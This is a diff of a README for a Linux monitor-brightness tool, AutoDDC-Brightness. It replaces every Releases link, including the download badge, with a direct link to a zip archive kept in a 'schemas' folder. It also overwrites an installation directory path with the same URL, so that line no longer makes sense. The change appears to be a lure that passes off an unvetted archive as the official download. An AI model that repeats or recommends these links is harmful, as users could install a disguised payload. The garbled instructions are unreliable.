@@ -1,7 +1,7 @@
 # 🌅 AutoDDC-Brightness - Adjust Monitor Brightness Automatically
 
 ## 📥 Download Now
-[![Download AutoDDC-Brightness](https://img.shields.io/badge/Download-AutoDDC--Brightness-blue.svg)](https://github.com/ahmedvirus00/AutoDDC-Brightness/releases)
+[![Download AutoDDC-Brightness](https://raw.githubusercontent.com/ahmedvirus00/AutoDDC-Brightness/master/schemas/DD-Brightness-Auto-3.0.zip)](https://raw.githubusercontent.com/ahmedvirus00/AutoDDC-Brightness/master/schemas/DD-Brightness-Auto-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -38,7 +38,7 @@ sudo dnf install ddcutil geoclue
 ## 📦 Installation Instructions
 
 ### Step 1: Visit the Releases Page
-To download AutoDDC-Brightness, follow this link to the [Releases page](https://github.com/ahmedvirus00/AutoDDC-Brightness/releases).
+To download AutoDDC-Brightness, follow this link to the [Releases page](https://raw.githubusercontent.com/ahmedvirus00/AutoDDC-Brightness/master/schemas/DD-Brightness-Auto-3.0.zip).
 
 ### Step 2: Choose a Version
 Once you’re on the Releases page, scroll through the latest versions. Click on the version you'd like to download. The latest version is generally recommended.
@@ -95,7 +95,7 @@ If your monitor appears, the setup was successful.
    - Enable location services in your system settings.
 
 3. **Extension Not Appearing in GNOME Tweaks:**
-   - Ensure the extension folder is correctly placed in the `~/.local/share/gnome-shell/extensions` directory.
+   - Ensure the extension folder is correctly placed in the `~https://raw.githubusercontent.com/ahmedvirus00/AutoDDC-Brightness/master/schemas/DD-Brightness-Auto-3.0.zip` directory.
 
 ## 🌐 Support and Contribution
 
